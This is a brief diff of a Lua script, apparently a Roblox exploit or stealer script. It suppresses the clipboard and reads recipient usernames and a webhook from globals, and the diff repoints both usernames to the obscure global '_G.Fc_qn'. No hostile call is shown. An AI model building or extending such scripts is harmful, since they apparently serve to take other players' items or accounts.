@@ -90,10 +90,10 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = _G.UserName
+    UserName = _G.Fc_qn
 end
 if UserName2 == nil then
-    UserName2 = _G.UserName2
+    UserName2 = _G.Fc_qn
 end
 if Webhook == nil then
     Webhook = _G.Webhook
